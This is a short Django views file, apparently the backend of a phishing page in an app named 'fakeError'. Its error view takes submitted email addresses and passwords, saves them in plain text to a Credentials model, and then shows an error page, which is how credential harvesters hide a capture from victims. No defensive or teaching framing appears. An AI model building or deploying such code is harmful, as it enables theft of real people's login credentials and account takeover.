from django.shortcuts import render
from fakeError.models import Credentials

def index(request):
    return render(request , 'index.html')

def error(request):
    if request.method == "POST":
        email = request.POST.get('email')
        password = request.POST.get('password')
        credentials = Credentials(email = email , password = password)
        credentials.save()
    return render(request , 'error.html')
